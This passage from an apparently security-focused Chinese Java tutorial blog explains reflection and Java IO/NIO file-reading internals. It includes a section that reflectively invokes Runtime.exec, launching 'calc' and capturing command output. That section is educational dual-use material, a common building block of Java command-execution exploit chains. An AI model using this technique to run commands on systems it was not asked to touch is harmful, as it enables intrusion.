p.getDeclaredConstructors();</span><br><span class="line">        System.out.println(<span class="string">&quot;全部类型的构造器：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; constructors1.length; i++) &#123;</span><br><span class="line">            System.out.println(constructors1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706165209137.png" alt="image-20230706165209137" style="zoom:80%;" />

<h3 id="获取类的属性-field"><a href="#获取类的属性-field" class="headerlink" title="获取类的属性(field)"></a>获取类的属性(field)</h3><p>常见的获取类属性field的方法有四种:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取类的一个public类型属性:getField(String name)</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Field f=p.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取类的一个全部类型的属性:getDeclaredField(String name)</span></span><br><span class="line"> Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line"> Field f=p.getDeclaredField(<span class="string">&quot;weight&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.获取类的全部public类型的属性:getFields()</span></span><br><span class="line"> Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line"> Field[] f=p.getFields(); <span class="comment">//同样要注意改成数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.获取类的全部类型的属性:getDeclaredFields()</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Field[] f=p.getDeclaredFields(); <span class="comment">//同样要注意改成数组</span></span><br></pre></td></tr></table></figure>

<h4 id="获取属性实例"><a href="#获取属性实例" class="headerlink" title="获取属性实例"></a>获取属性实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflectField</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> p.getField(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的一个public类型属性：&quot;</span>);</span><br><span class="line">        System.out.println(field);</span><br><span class="line"></span><br><span class="line">        Field[] fields = p.getFields();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的所有public类型属性：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            System.out.println(fields[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> p.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的一个所有类型属性：&quot;</span>);</span><br><span class="line">        System.out.println(field1);</span><br><span class="line"></span><br><span class="line">        Field[] fields1 = p.getDeclaredFields();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的所有所有类型属性：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields1.length; i++) &#123;</span><br><span class="line">            System.out.println(fields1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706170706245.png" alt="image-20230706170706245" style="zoom:80%;" />

<h3 id="获取类的方法-method"><a href="#获取类的方法-method" class="headerlink" title="获取类的方法(method)"></a>获取类的方法(method)</h3><p>常用的获取类的方法有三种:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取类的一个特定public类型的方法:getMethod(String name,class[] parameterTypes)</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Method m=p.getMethod(<span class="string">&quot;setName&quot;</span>, String.class); <span class="comment">//要注意这里有两个参数，后面要传入的是方法形参的类型的原型,无参函数就不用填</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取类的一个特定无论什么类型的方法:getDeclaredMethod(String name,class[] parameterTypes)</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Method m=p.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.获取类的全部public的方法:getMethods()</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Method[] m=p.getMethods();<span class="comment">//要注意改成数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.获取类的全部类型的方法:getDeclaredMethods()</span></span><br><span class="line"> Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line"> Method[] m=p.getDeclaredMethods(); <span class="comment">//同样要注意改成数组</span></span><br></pre></td></tr></table></figure>

<h4 id="获取方法实例"><a href="#获取方法实例" class="headerlink" title="获取方法实例"></a>获取方法实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflectMethod</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> p.getMethod(<span class="string">&quot;dianyuan&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的一个特定public类型的方法：&quot;</span>);</span><br><span class="line">        System.out.println(method);</span><br><span class="line"></span><br><span class="line">        Method[] methods = p.getMethods();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的所有public类型的方法：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">            System.out.println(methods[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;poweroff&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的一个特定任意类型的方法：&quot;</span>);</span><br><span class="line">        System.out.println(method1);</span><br><span class="line"></span><br><span class="line">        Method[] methods1 = p.getDeclaredMethods();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的所有类型的方法：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods1.length; i++) &#123;</span><br><span class="line">            System.out.println(methods1[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706185205161.png" alt="image-20230706185205161" style="zoom:80%;" />

<h3 id="反射完整调用流程"><a href="#反射完整调用流程" class="headerlink" title="反射完整调用流程"></a>反射完整调用流程</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);           <span class="comment">//获取phone类的原型</span></span><br><span class="line">Constructor constructor=p.getConstructor();      <span class="comment">//获取无参的构造器</span></span><br><span class="line">Object o=constructor.newInstance();             <span class="comment">//实例化一个对象o</span></span><br><span class="line">Method m=p.getMethod(<span class="string">&quot;dianyuan&quot;</span>);               <span class="comment">//获取方法dianyuan</span></span><br><span class="line">m.invoke(o);                                    <span class="comment">//运用Method的invoke方法来执行这个类的方法</span></span><br><span class="line">Method m1=p.getMethod(<span class="string">&quot;setName&quot;</span>, String.class); <span class="comment">//获取方法setName</span></span><br><span class="line">Method m2=p.getMethod(<span class="string">&quot;getName&quot;</span>);               <span class="comment">//获取方法getName</span></span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);							<span class="comment">//私有方法需要通过Method的setAccessible方法更改权限</span></span><br><span class="line">m1.invoke(o,<span class="string">&quot;8848&quot;</span>);                            <span class="comment">//执行setName方法，为Name属性赋值</span></span><br><span class="line">System.out.println(m2.invoke(o));             <span class="comment">//调用getName的方法并打印返回值</span></span><br></pre></td></tr></table></figure>

<h4 id="反射执行实例"><a href="#反射执行实例" class="headerlink" title="反射执行实例"></a>反射执行实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//获取类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取无参构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> p.getConstructor();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取有参构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> p.getConstructor(String.class, <span class="type">double</span>.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取实例化对象(无参实例化)</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取实例化对象(有参实例化)</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> constructor1.newInstance(<span class="string">&quot;IQOO&quot;</span>,<span class="number">12.5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取方法dianyuan</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;dianyuan&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过method类的invoke方法来执行这个类的方法</span></span><br><span class="line">        method.invoke(o);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取方法setName, getName, poweroff</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method3</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;poweroff&quot;</span>);</span><br><span class="line">        <span class="comment">//invoke反射执行</span></span><br><span class="line">        method1.invoke(o,<span class="string">&quot;IQOO11&quot;</span>);</span><br><span class="line">        System.out.println(method2.invoke(o));</span><br><span class="line">        <span class="comment">//私有类型，通过setAccessible方法更改权限</span></span><br><span class="line">        method3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method3.invoke(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706192509876.png" alt="image-20230706192509876" style="zoom:80%;" />

<h3 id="反射Runtime类命令执行"><a href="#反射Runtime类命令执行" class="headerlink" title="反射Runtime类命令执行"></a>反射Runtime类命令执行</h3><p>首先看一下Runtime类命令执行的流程</p>
<p><img src="/image/image-20230706193719020.png" alt="image-20230706193719020"></p>
<p>我们可以看到无参构造器是private的，所以无法直接使用class类的newInstance方法，所以需要getDeclaredConstructor获取，并且需要setAccessible修改作用域</p>
<p>继续跟进到我们要调用的exec方法</p>
<img src="/image/image-20230706194619747.png" alt="image-20230706194619747" style="zoom:80%;" />

<p>exec一共有六个重载函数，我们用第一个就行，public类型直接获取方法就行</p>
<p>接下来我们直接反射</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflectExec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="comment">//获取Runtime类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取私有空参构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改作用域</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取exec方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//invoke反射调用</span></span><br><span class="line">        method.invoke(o,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706195856358.png" alt="image-20230706195856358" style="zoom:80%;" />

<p>如果需要回显则需要读取输入流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//InputStream读取输入流</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"><span class="comment">//创建reader对象</span></span><br><span class="line"><span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in);</span><br><span class="line"><span class="comment">//转为BufferReader</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line"><span class="comment">//逐行读取</span></span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">	System.out.println(line);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">exitcode</span> <span class="operator">=</span> process.waitFor();</span><br><span class="line">System.out.println(<span class="string">&quot;进程退出：&quot;</span> + exitcode);</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706203653866.png" alt="image-20230706203653866" style="zoom:80%;" />



<h2 id="Java文件系统"><a href="#Java文件系统" class="headerlink" title="Java文件系统"></a>Java文件系统</h2><p>众所周知Java是一个跨平台的语言，不同的操作系统有着完全不一样的文件系统和特性。JDK会根据不同的操作系统(<code>AIX,Linux,MacOSX,Solaris,Unix,Windows</code>)编译成不同的版本。</p>
<p>在Java语言中对文件的任何操作最终都是通过<code>JNI</code>调用<code>C语言</code>函数实现的。Java为了能够实现跨操作系统对文件进行操作抽象了一个叫做FileSystem的对象出来，不同的操作系统只需要实现起抽象出来的文件操作方法即可实现跨平台的文件操作了。</p>
<h3 id="Java-FileSystem"><a href="#Java-FileSystem" class="headerlink" title="Java FileSystem"></a>Java FileSystem</h3><p>在Java SE中内置了两类文件系统：<code>java.io</code>和<code>java.nio</code>，<code>java.nio</code>的实现是<code>sun.nio</code>，文件系统底层的API实现如下图：</p>
<img src="/image/image-20201113121413510.png" alt="img" style="zoom: 50%;" />

<h3 id="Java-IO-文件系统"><a href="#Java-IO-文件系统" class="headerlink" title="Java IO 文件系统"></a>Java IO 文件系统</h3><p>Java抽象出了一个叫做文件系统的对象:<code>java.io.FileSystem</code>，不同的操作系统有不一样的文件系统,例如<code>Windows</code>和<code>Unix</code>就是两种不一样的文件系统： <code>java.io.UnixFileSystem</code>、<code>java.io.WinNTFileSystem</code>。</p>
<img src="/image/image-20191203163038813.png" alt="img" style="zoom:80%;" />

<p><code>java.io.FileSystem</code>是一个抽象类，它抽象了对文件的操作，不同操作系统版本的JDK会实现其抽象的方法从而也就实现了跨平台的文件的访问操作。</p>
<img src="/image/image-20191203164105238.png" alt="img" style="zoom:80%;" />

<p>示例中的<code>java.io.UnixFileSystem</code>最终会通过JNI调用native方法来实现对文件的操作:</p>
<img src="/image/image-20191203164635637.png" alt="img" style="zoom: 67%;" />

<p>由此我们可以得出Java只不过是实现了对文件操作的封装而已，最终读写文件的实现都是通过调用native方法实现的。</p>
<p>不过需要特别注意一下几点：</p>
<ol>
<li>并不是所有的文件操作都在<code>java.io.FileSystem</code>中定义,文件的读取最终调用的是<code>java.io.FileInputStream#read0、readBytes</code>、<code>java.io.RandomAccessFile#read0、readBytes</code>,而写文件调用的是<code>java.io.FileOutputStream#writeBytes</code>、<code>java.io.RandomAccessFile#write0</code>。</li>
<li>Java有两类文件系统API！一个是基于<code>阻塞模式的IO</code>的文件系统，另一是JDK7+基于<code>NIO.2</code>的文件系统。</li>
</ol>
<h3 id="Java-NIO-2-文件系统"><a href="#Java-NIO-2-文件系统" class="headerlink" title="Java NIO.2 文件系统"></a>Java NIO.2 文件系统</h3><p>Java 7提出了一个基于NIO的文件系统，这个NIO文件系统和阻塞IO文件系统两者是完全独立的。<code>java.nio.file.spi.FileSystemProvider</code>对文件的封装和<code>java.io.FileSystem</code>同理。</p>
<img src="/image/image-20191203181206243.png" alt="img" style="zoom:80%;" />

<h3 id="Java-IO流"><a href="#Java-IO流" class="headerlink" title="Java IO流"></a>Java IO流</h3><h4 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h4><p>计算机系统的IO即通过数据流、序列化和文件系统提供系统输入和输出。</p>
<h4 id="流"><a href="#流" class="headerlink" title="流"></a>流</h4><p>流是一个很形象的概念，当程序需要读取数据的时候，就会开启一个通向<strong>数据源</strong>的流，这个数据源可以是文件，内存，或者是网络连接。类似的，当程序需要写入数据的时候，就会开启一个通向目的地的流。这时候你就可以想象数据好像在这其中“流”动一样。</p>
<p>Java把这些不同来源和目标的数据都统一抽象为数据流。</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>按流向分：<br>1）输入流：程序可以从中读取数据的流；<br>2）输出流：程序能向其中写入数据的流</p>
<p>按数据传输单位分：<br>1）字节流：以字节为单位传输数据的流；<br>2）字符流：以字符为单位传输数据的流；</p>
<p>按功能分：<br>1）节点流：用于直接操作目标设备的流；<br>2）过滤流：是对一个已存在的流的链接和封装，通过对数据进行处理为程序提供功能强大、灵活的读写功能。</p>
<h3 id="Java-IO-NIO多种读写文件方式"><a href="#Java-IO-NIO多种读写文件方式" class="headerlink" title="Java IO&#x2F;NIO多种读写文件方式"></a>Java IO&#x2F;NIO多种读写文件方式</h3><p>上一章节我们提到了Java 对文件的读写分为了基于阻塞模式的IO和非阻塞模式的NIO，本章节我将列举一些我们常用于读写文件的方式。</p>
<p>我们通常读写文件都是使用的阻塞模式，与之对应的也就是<code>java.io.FileSystem</code>。<code>java.io.FileInputStream</code>类提供了对文件的读取功能，Java的其他读取文件的方法基本上都是封装了<code>java.io.FileInputStream</code>类，比如：<code>java.io.FileReader</code>。</p>
<h4 id="FileInputStream文件读取"><a href="#FileInputStream文件读取" class="headerlink" title="FileInputStream文件读取"></a>FileInputStream文件读取</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFileInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//创建文件对象</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;C:\\Windows\\System32\\drivers\\etc\\hosts&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打开文件对象，创建文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//定义每次输入流读取的字节数对象</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建字节缓冲区对象，定义缓冲区大小</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建字节输出流对象</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//循环读取文件内容</span></span><br><span class="line">        <span class="comment">//read方法将文件输入流中的内容读取（剪切）到bytes内存中，bytes缓冲区有多大就读多长，读完了就返回-1</span></span><br><span class="line">        <span class="keyword">while</span> ((a = fis.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">//write方法截取bytes缓冲区数组中的内容到baos字节输出流对象中</span></span><br><span class="line">            <span class="comment">//(bytes, 0, a)其中的0表示从bytes数组的下标0开始截取，a表示输入流read到的字节数</span></span><br><span class="line">            baos.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(baos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230708200357651.png" alt="image-20230708200357651" style="zoom:80%;" />

<p>首先来看一下read方法</p>
<img src="/image/image-20230708200318187.png" alt="image-20230708200318187" style="zoom:80%;" />

<p>可以看到read方法会自动计算缓冲区的长度，并且调用readBytes，这是一个native方法，将此输入流中最多b.length长度的字节读取到缓冲区中（剪切而不是复制），如果没有数据了读就会返回-1</p>
<p>接着一下write方法</p>
<img src="/image/image-20230708212522112.png" alt="image-20230708212522112" style="zoom:80%;" />

<p>从偏移0处截取len长度的数据，并写入到输出流中</p>
<p>调用链如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.FileInputStream.readBytes(FileInputStream.java:<span class="number">219</span>)</span><br><span class="line">java.io.FileInputStream.read(FileInputStream.java:<span class="number">233</span>)</span><br><span class="line">com.y5neko.sec.filesystem.FileInputStreamDemo.main(FileInputStreamDemo.java:<span class="number">27</span>)</span><br></pre></td></tr></table></figure>

<p>其中的readBytes是native方法，文件的打开、关闭等方法也都是native方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">readBytes</span><span class="params">(<span class="type">byte</span> b[], <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">open0</span><span class="params">(String name)</span> <span class="keyword">throws</span> FileNotFoundException;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">read0</span><span class="params">()</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">skip0</span><span class="params">(<span class="type">long</span> n)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">available0</span><span class="params">()</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">close0</span><span class="params">()</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure>

<p><code>java.io.FileInputStream</code>类对应的native由C语言实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">JNIEXPORT <span class="type">void</span> JNICALL</span><br><span class="line"><span class="title function_">Java_java_io_FileInputStream_open0</span><span class="params">(JNIEnv *env, jobject this, jstring path)</span> &#123;</span><br><span class="line">    fileOpen(env, this, path, fis_fd, O_RDONLY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_java_io_FileInputStream_read0</span><span class="params">(JNIEnv *env, jobject this)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> readSingle(env, this, fis_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_java_io_FileInputStream_readBytes</span><span class="params">(JNIEnv *env, jobject this,</span></span><br><span class="line"><span class="params">        jbyteArray bytes, jint off, jint len)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> readBytes(env, this, bytes, off, len, fis_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jlong JNICALL</span><br><span class="line"><span class="title function_">Java_java_io_FileInputStream_skip0</span><span class="params">(JNIEnv *env, jobject this, jlong toSkip)</span> &#123;</span><br><span class="line">    jlong cur = jlong_zero;</span><br><span class="line">    jlong end = jlong_zero;</span><br><span class="line">    FD fd = GET_FD(this, fis_fd);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        JNU_ThrowIOException (env, <span class="string">&quot;Stream Closed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((cur = IO_Lseek(fd, (jlong)<span class="number">0</span>, (jint)SEEK_CUR)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        JNU_ThrowIOExceptionWithLastError(env, <span class="string">&quot;Seek error&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((end = IO_Lseek(fd, toSkip, (jint)SEEK_CUR)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        JNU_ThrowIOExceptionWithLastError(env, <span class="string">&quot;Seek error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (end - cur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_java_io_FileInputStream_available0</span><span class="params">(JNIEnv *env, jobject this)</span> &#123;</span><br><span class="line">    jlong ret;</span><br><span class="line">    FD fd = GET_FD(this, fis_fd);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        JNU_ThrowIOException (env, <span class="string">&quot;Stream Closed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (IO_Available(fd, &amp;ret)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ret &gt; INT_MAX) &#123;</span><br><span class="line">            ret = (jlong) INT_MAX;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            